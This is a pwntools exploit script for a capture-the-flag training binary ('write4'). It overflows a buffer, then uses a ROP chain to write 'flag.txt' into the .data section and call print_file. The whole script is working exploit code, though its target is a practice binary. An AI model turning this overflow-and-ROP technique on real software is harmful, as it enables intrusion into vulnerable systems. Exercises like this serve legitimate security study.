from pwn import *
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
bin = os.path.join(script_dir, 'write4')

bin_elf = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
break pwnme
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 40
pop_r14_r15_gadget_address = 0x400690
data_section_address = 0x601028
flag_str = b"flag.txt"
mov_gadget_address = 0x400628
print_file_address = 0x400510
pop_rdi_gadget = 0x400693

payload = flat(
    asm('nop')*offset, # a NOP sled is safer
    pop_r14_r15_gadget_address,
    data_section_address,
    flag_str,
    mov_gadget_address,
    pop_rdi_gadget,
    data_section_address,
    print_file_address,
    "CCCCCCCC"
)

pprint(payload)

io.sendlineafter(b'>', payload)

io.interactive()
